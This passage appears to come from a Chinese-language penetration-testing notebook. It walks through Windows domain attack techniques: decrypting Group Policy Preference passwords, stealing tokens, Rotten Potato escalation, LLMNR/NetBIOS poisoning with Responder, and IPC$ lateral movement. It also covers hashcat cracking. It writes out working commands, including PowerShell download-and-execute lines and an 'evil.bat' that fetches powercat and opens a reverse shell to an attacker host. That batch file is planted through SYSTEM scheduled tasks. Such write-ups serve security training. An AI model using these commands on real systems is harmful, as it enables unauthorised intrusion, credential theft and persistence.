href="https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py">https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py</a></p><pre class="line-numbers language-none"><code class="language-none">python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728143302.png"></p><h3 id="PowerShell-脚本"><a href="#PowerShell-脚本" class="headerlink" title="PowerShell 脚本"></a>PowerShell 脚本</h3><p>PowerSploit 项目中提供了 Get-GPPPassword.ps1 脚本。</p><p>脚本下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p><p>直接远程下载脚本执行：</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果无法下载可以使用 github 代理</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728144214.png"></p><p>或者下载到本地，执行也行</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-GPPPassword.ps1Get-GPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>使用 post/windows/gather/credentials/gpp 模块也可以</p><pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gppset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728145138.png"></p><h1 id="0x17-令牌窃取"><a href="#0x17-令牌窃取" class="headerlink" title="0x17 令牌窃取"></a>0x17 令牌窃取</h1><h2 id="0、前言-2"><a href="#0、前言-2" class="headerlink" title="0、前言"></a>0、前言</h2><p>令牌（Token）是指系统中的临时秘钥，相当于账户和密码，有了令牌就可以在不知道密码的情况下访问目标相关资源了，这些令牌将持续存在于系统中，除非系统重新启动。</p><h2 id="1、MSF"><a href="#1、MSF" class="headerlink" title="1、MSF"></a>1、MSF</h2><p>在获取到 Meterpreter Shell 后，使用以下命令获取令牌</p><pre class="line-numbers language-none"><code class="language-none">load incognitolist_tokens -u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729095721.png"></p><p>这里有两种令牌，一个是 Delegation Tokens 即授权令牌，还有一种是 Impersonation Tokens 即模拟令牌。前者支持交互式登录比如远程桌面，后者支持非交互的会话。</p><p>令牌获取的数量取决于获取到 Shell 的权限等级。</p><p>如果已经获取到了 SYSTEM 权限的令牌，那么攻击者就可以伪造这个令牌，拥有对应的权限。</p><pre class="line-numbers language-none"><code class="language-none">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729100415.png"></p><p>可以看到我们已经通过伪造 SYSTEM 的令牌拿到 SYSTEM 权限了。</p><p>不过值得注意的是，如果不加双引号，\ 需要改成 <code>\\</code> 才行，个人猜测可能是因为 \ 被当做转义字符处理的原因。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729100653.png"></p><h2 id="2、Rotten-Potato-本地提权"><a href="#2、Rotten-Potato-本地提权" class="headerlink" title="2、Rotten Potato 本地提权"></a>2、Rotten Potato 本地提权</h2><p>Rotten Potato 直译过来就烂土豆的意思，如果目标中存在有效的令牌，就可以通过 Rotten Potato 模拟用户令牌实现提权。</p><p>Rotten Potato 项目地址：<a href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a></p><p>运行 RottenPotato.exe 直接弹出 SYSTEM 权限的 CMD 窗口，不需要用到 MSF。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729101949.png"></p><h1 id="0x18-LLMNR-和-NetBIOS-欺骗攻击"><a href="#0x18-LLMNR-和-NetBIOS-欺骗攻击" class="headerlink" title="0x18 LLMNR 和 NetBIOS 欺骗攻击"></a>0x18 LLMNR 和 NetBIOS 欺骗攻击</h1><h2 id="0、前言-3"><a href="#0、前言-3" class="headerlink" title="0、前言"></a>0、前言</h2><p>如果已经进入目标网络，但是没有获得凭证，可以使用 LLMNR 和 NetBIOS 欺骗攻击对目标进行无凭证条件下的权限获取。</p><h2 id="1、基本概念"><a href="#1、基本概念" class="headerlink" title="1、基本概念"></a>1、基本概念</h2><h3 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h3><p>本地链路多播名称解析（LLMNR）是一种域名系统数据包格式，当局域网中的 DNS 服务器不可用时，DNS 客户端就会使用 LLMNR 解析本地网段中机器的名称，直到 DNS 服务器恢复正常为止。</p><p>从 Windows Vista 开始支持 LLMNR ，Linux 系统也通过 systemd 实现了此协议，同时 LLMNR 也支持 IPv6。</p><h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><p>NetBIOS 协议是由 IBM 公司开发，主要用于数十台计算机的小型局域网，根据 NetBIOS 协议广播获得计算机名称，并将其解析成相应的 IP 地址。</p><p>从 Windows NT 以后版本的所有操作系统中都可以使用 NetBIOS，不过 NetBIOS 不支持 IPv6.</p><p>NetBIOS 提供的三种服务：</p><pre><code>i、NetBIOS-NS（名称服务）：主要用于名称注册和解析，以启动会话和分发数据报，该服务默认监听 UDP 137 端口，也可以使用 TCP 的 137 端口进行监听。ii、Datagram Distribution Service（数据报分发服务）：无连接服务，该服务负责进行错误检测和恢复，默认监听 UDP 138 端口。iii、Session Service（会话服务）：允许两台计算机建立连接，默认使用 TCP 139 端口。</code></pre><h3 id="Net-NTLM-Hash"><a href="#Net-NTLM-Hash" class="headerlink" title="Net-NTLM Hash"></a>Net-NTLM Hash</h3><blockquote><p>NTLM 即 NT LAN Manager，NTLM 是指 telnet 的一种验证身份方式，即问询/应答协议，是 Windows NT 早期版本的标准安全协议。</p></blockquote><p>Net-NTLM Hash 不同于 NTLM Hash，NTLM Hash 是 Windows 登录密码的 Hash 值，可以在 Windows 系统的 SAM 文件或者域控的 NTDS.dit 文件中提取到出来，NTLM Hash 支持哈希传递攻击。 </p><p>Net-NTLM Hash 是网络环境下 NTLM 认证的 Hash，使用 Responder 抓取的通常就是 Net-NTLM Hash，该 Hash 不能进行哈希传递，但可用于 NTLM 中继攻击或者使用 Hashcat 等工具碰撞出明文进行横向。</p><h2 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h2><p>Responder 是一款使用 Python 编写用于毒化 LLMNR 和 NBT-NS 请求的一款工具。</p><p>假设我们已连接到 Windows Active Directory 环境，当网络上的设备尝试用 LLMNR 和 NBT-NS（NetBIOS 名称服务）请求来解析目标机器时，Responder 就会伪装成目标机器。</p><p>当受害者机器尝试登陆攻击者机器，Responder 就可以获取受害者机器用户的 Net-NTLM 哈希值。</p><p>Responder 项目地址：<a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p><p>Responder 不支持 Windows，这里使用 Kali 进行演示。</p><p>Responder 开启监听，-I 指定网卡，这里 eth1 的 IP 为 192.168.7.65</p><pre class="line-numbers language-none"><code class="language-none">python Responder.py -I eth1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启监听后，当目标主机上有人访问 Responder 主机的共享目录时，就会看到对方的 Net-NTLM 哈希值了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729190444.png"></p><p>再利用 Hashcat 进行碰撞</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 5600 hash.txt password.txt -D 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210729190835.png"></p><h1 id="0x19-IPC-与计划任务"><a href="#0x19-IPC-与计划任务" class="headerlink" title="0x19 IPC 与计划任务"></a>0x19 IPC 与计划任务</h1><h2 id="0、前言-4"><a href="#0、前言-4" class="headerlink" title="0、前言"></a>0、前言</h2><p>在多层代理的环境中，由于网络限制，通常采用命令行的方式连接主机，这里学习下 IPC 建立会话与配置计划任务的相关点。</p><h2 id="1、IPC"><a href="#1、IPC" class="headerlink" title="1、IPC"></a>1、IPC</h2><p>IPC (Internet Process Connection) 是为了实现进程间通信而开放的命名管道，当目标开启了 IPC$ 文件共享并得到用户账号密码后，就可以使用 IPC 建立连接，获取权限。</p><p>建立 IPC 连接：</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入 net use 可以查看当前建立的连接</p><pre class="line-numbers language-none"><code class="language-none">C:\&gt;net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator命令成功完成。C:\&gt;net use会记录新的网络连接。状态       本地        远程                      网络-------------------------------------------------------------------------------OK                     \\192.168.7.107\ipc$      Microsoft Windows Network命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>映射磁盘到本地</p><pre class="line-numbers language-none"><code class="language-none">net use t: \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想删除映射的磁盘</p><pre class="line-numbers language-none"><code class="language-none">net use t: &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>dir 列出对方目录</p><pre class="line-numbers language-none"><code class="language-none">dir \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\&gt;dir \\192.168.7.107\c$ 驱动器 \\192.168.7.107\c$ 中的卷没有标签。 卷的序列号是 BC2F-8F01 \\192.168.7.107\c$ 的目录2020&#x2F;11&#x2F;24  17:28    &lt;DIR&gt;          Program Files2020&#x2F;11&#x2F;24  17:26    &lt;DIR&gt;          Program Files (x86)2021&#x2F;02&#x2F;13  17:49    &lt;DIR&gt;          TEMP2021&#x2F;08&#x2F;02  11:42    &lt;DIR&gt;          Users2020&#x2F;11&#x2F;25  08:37    &lt;DIR&gt;          Windows               0 个文件              0 字节              5 个目录 32,833,009,664 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>tasklist 查看进程</p><pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\&gt;tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX映像名称                       PID 会话名              会话#       内存使用&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;System Idle Process              0                            0         24 KSystem                           4                            0        368 Ksmss.exe                       260                            0        628 Kcsrss.exe                      356                            0      2,360 Kwininit.exe                    408                            0        264 Kcsrss.exe                      420                            1      8,692 Kwinlogon.exe                   468                            1      2,012 Kservices.exe                   512                            0      7,460 Klsass.exe                      520                            0     10,216 Klsm.exe                        528                            0      4,148 Kspoolsv.exe                   1356                            0      6,504 Ksvchost.exe                   1392                            0      7,028 K<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 \del 可断开连接</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.107\ipc$ &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、计划任务"><a href="#2、计划任务" class="headerlink" title="2、计划任务"></a>2、计划任务</h2><p>Windows 可用于创建计划任务的命令有两个，分别是 at 和 schtasks，at 在 Windows Server 2008 及之后的系统中，已经被废弃了。</p><p>这里看看在建立 IPC 连接后，使用计划任务运行可执行文件，主要步骤如下：</p><p>1、查看目标主机时间</p><p>2、上传可执行文件到目标主机</p><p>3、设置计划任务执行可执行文件</p><p>4、删除计划任务</p><p>首先查看下目标主机时间</p><pre class="line-numbers language-none"><code class="language-none">net time \\192.168.7.107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\&gt;net time \\192.168.7.107\\192.168.7.107 的当前时间是 2021&#x2F;8&#x2F;2 14:28:01命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建一个反弹木马 bat 程序，这里使用 PowerShell 进行反弹，bat 文件内容如下：</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c 192.168.7.4 -p 4444 -e cmd&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在攻击机上开启 nc 监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 bat 程序上传到目标主机</p><pre class="line-numbers language-none"><code class="language-none">copy evil.bat \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 at 创建计划任务</p><pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 14:30 C:\evil.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想清除 ID 为 1 的计划任务</p><pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 1 &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 schtasks 创建计划任务</p><pre class="line-numbers language-none"><code class="language-none"># 开机以 system 权限执行 C:\evil.batschtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;sc onstart &#x2F;tr C:\evil.bat &#x2F;ru system &#x2F;f# 在 2021&#x2F;08&#x2F;03 前的每一天的 14:30:00 执行 C:\evil.batschtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;tr C:\evil.bat &#x2F;sc daily &#x2F;st 14:30:00 &#x2F;ed 2021&#x2F;08&#x2F;03# 立刻运行名称为 evil 的任务schtasks &#x2F;run &#x2F;s 192.168.7.107 &#x2F;i &#x2F;tn &quot;evil&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想清除名称为 evil 的计划任务</p><pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;delete &#x2F;s 192.168.7.107 &#x2F;tn &quot;evil&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在建立 IPC 连接后，除了使用计划任务进行间接的反弹 Shell，还可以通过 PsExec 直接反弹 Shell</p><p>PsExec 下载地址：<a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><pre class="line-numbers language-none"><code class="language-none">Psexec.exe -accepteula \\192.168.7.107 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210802180916.png"></p><h1 id="0x20-Hashcat-的使用"><a href="#0x20-Hashcat-的使用" class="headerlink" title="0x20 Hashcat 的使用"></a>0x20 Hashcat 的使用</h1><h2 id="1、介绍-6"><a href="#1、介绍-6" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Hashcat 是一款用于破解密码的工具，据说是世界上最快最高级的密码破解工具，支持 LM 哈希、MD5、SHA 等系列的密码破解，同时也支持 Linux、Mac、Windows 平台。</p><p>工具地址：<a href="https://hashcat.net/">https://hashcat.net</a></p><p>项目地址：<a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p><h2 id="2、安装-3"><a href="#2、安装-3" class="headerlink" title="2、安装"></a>2、安装</h2><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><p>Mac 用户直接使用 brew 安装即可</p><pre class="line-numbers language-none"><code class="language-none">brew install hashcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><p>对于 Debain 的 Linux，比如 Kali、Ubuntu 可以直接使用 apt 进行安装</p><pre class="line-numbers language-none"><code class="language-none">apt install hashcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者下载官方二进制文件进行安装</p><p>在 <a href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，这里以 6.2.4 版为例</p><pre class="line-numbers language-none"><code class="language-none">tar zxvf hashcat-6.2.4.7zcd hashcat-6.2.4chmod +x hashcat.bin.&#x2F;hashcat.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><p>在 <a href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，解压后可以看到 hashcat.exe</p><h2 id="3、使用-3"><a href="#3、使用-3" class="headerlink" title="3、使用"></a>3、使用</h2><p>常用参数：</p><pre class="line-numbers language-none"><code class="language-none">-r使用自定义破解规则-o指定破解成功后的 hash 及所对应的明文密码的存放位置-m指定要破解的 hash 类型，如果不指定类型，则默认是 MD5-a指定要使用的破解模式，其值参考后面对参数。“-a 0” 字典攻击，“-a 1” 组合攻击；“-a 3” 掩码攻击-D指定 opencl 的设备类型--show显示已经破解的 hash 及该 hash 所对应的明文--force忽略破解过程中的警告信息,跑单条 hash 可能需要加上此选项--remove删除已被破解成功的 hash--username忽略 hash 文件中的指定的用户名,在破解 linux 系统用户密码 hash 可能会用到--increment启用增量破解模式,你可以利用此模式让 hashcat 在指定的密码长度范围内执行破解过程--increment-min密码最小长度,后面直接等于一个整数即可,配置 increment 模式一起使用--increment-max密码最大长度,同上--outfile-format指定破解结果的输出格式 id ,默认是 3--self-test-disable    关闭启动自检<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-a 破解模式：</p><pre class="line-numbers language-none"><code class="language-none">0 | Straight（字段破解）1 | Combination    （组合破解）3 | Brute-force    （掩码暴力破解）6 | Hybrid Wordlist + Mask（字典+掩码破解）7 | Hybrid Mask + Wordlist（掩码+字典破解）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-D 指定设备类型</p><pre class="line-numbers language-none"><code class="language-none">1 | CPU2 | GPU3 | FPGA, DSP, Co-Processor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一般使用 -D 2 指定 GPU 破解</p><p>掩码设置：</p><pre class="line-numbers language-none"><code class="language-none">l | abcdefghijklmnopqrstuvwxyz纯小写字母u | ABCDEFGHIJKLMNOPQRSTUVWXYZ纯大写字母d | 0123456789纯数字h | 0123456789abcdef十六进制小写字母和数字H | 0123456789ABCDEF    十六进制大写字母和数字s |  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~    特殊字符a | ?l?u?d?s键盘上所有可见的字符b | 0x00 - 0xff匹配密码空格<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>掩码设置举例：</p><pre class="line-numbers language-none"><code class="language-none">八位数字密码：?d?d?d?d?d?d?d?d八位未知密码：?a?a?a?a?a?a?a?a前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>自定义掩码规则：</p><pre class="line-numbers language-none"><code class="language-none">--custom-charset1 [chars]等价于 -1--custom-charset2 [chars]等价于 -2--custom-charset3 [chars]等价于 -3--custom-charset4 [chars]等价于 -4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在掩码中用 ?1、?2、?3、?4 来表示</p><p>注意：</p><ul><li>–custom-charset1 abcd ?1?1?1?1?1 等价于 -1 abcd ?1?1?1?1?1</li><li>-3 abcdef -4 123456 ?3?3?3?3?4?4?4?4 表示前四位可能是 adbcdef，后四位可能是 123456</li></ul><p>另外 Hash 模式与 ID 的对照表由于太长，这里就不放了，可以直接 hashcat -h 进行查看</p><h2 id="4、示例"><a href="#4、示例" class="headerlink" title="4、示例"></a>4、示例</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>密码为 8 位数字</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force d54d1702ad0f8326224b817c796763c9 ?d?d?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>密码为 4 位小写字母+数字</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force 4575621b0d88c303998e63fc74d165b0 -1 ?l?d ?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>密码为 1-4 位大写字母+数字</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force 8fb5a3e7338ce951971d69be27fc5210 -1 ?u?d ?1?1?1?1 --increment --increment-min 1 --increment-max 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定特定字符集：123456abcdf!@+- 进行破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于在终端里可能会把部分字符识别为特殊字符，因此需要转义一下</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -1 123456abcdf\!\@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不知道目标密码的构成情况，可以直接使用 ?a 表示使用所有字符进行破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 19b9a36f0cab6d89cd4d3c21b2aa15be --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用字典破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 e10adc3949ba59abbe56e057f20f883e password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用字典批量破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 hash.txt password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>字典组合破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 1 77b3e6926e7295494dd3be91c6934899 pwd1.txt pwd2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>经过测试，这里的字典组合破解，不是说简单的将两个字典的内容合并去重形成 1 个字典进行去重，而是说字典 1 的内容加上字典 2 的内容组合成一个字典，例如：</p><p>pwd1.txt 字典为：</p><pre class="line-numbers language-none"><code class="language-none">admintestroot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>pwd2.txt 字典为：</p><pre class="line-numbers language-none"><code class="language-none">@2021123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么组合后的字典就是这样的：</p><pre class="line-numbers language-none"><code class="language-none">admin@2021admin123test@2021test123root@2021root123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>字典+掩码破解，也是和上面一样的组合方法，只不过 pwd2.txt 换成了掩码</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 6 e120ea280aa50693d5568d0071456460 pwd1.txt ?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Mysql4-1-5"><a href="#Mysql4-1-5" class="headerlink" title="Mysql4.1/5"></a>Mysql4.1/5</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>可以使用 select authentication_string from mysql.user; 查看当前数据库中的密码哈希值。</p></blockquote><h3 id="sha512crypt-6-SHA512-Unix"><a href="#sha512crypt-6-SHA512-Unix" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)"></a>sha512crypt $6$, SHA512 (Unix)</h3><p>sha512crypt $6$, SHA512 (Unix) 破解，为了避免系统误识别到特殊字符，这里为哈希值加了单引号</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1800 --force &#39;$6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew&#x2F;xd0O0hPG&#x2F;yrm2X.&#39; ?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>可通过 cat /etc/shadow 获取哈希值</p></blockquote><p>或者不删除用户名，直接使用 –username 参数</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1800 --force &#39;qiyou:$6$QDq75ki3$jsKm7qTDHz&#x2F;xBob0kF1Lp170Cgg0i5Tslf3JW&#x2F;sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1&#39; ?l?l?l?l?l --username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>NT Hash</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>LM Hash</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NetNTLM Hash</p><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 5500 teams.six::::822795daaf96s0a811fs6dd7b01dscssc601635cc1339basda6:e125cddcf51337asc7 -1 ?l?u ?1?1?1?1?d?d?d?d  --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MSSQL-2005"><a href="#MSSQL-2005" class="headerlink" title="MSSQL (2005)"></a>MSSQL (2005)</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="WordPress-密码-hash"><a href="#WordPress-密码-hash" class="headerlink" title="WordPress 密码 hash"></a>WordPress 密码 hash</h3><pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 -m 400 --force &#39;$P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY&#x2F;&#39; ?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>具体加密脚本在 ./wp-includes/class-phpass.php 的 HashPassword 函数</p></blockquote><h3 id="Discuz-用户密码-hash"><a href="#Discuz-用户密码-hash" class="headerlink" title="Discuz 用户密码 hash"></a>Discuz 用户密码 hash</h3><pre class="line-numbers language-none"><code 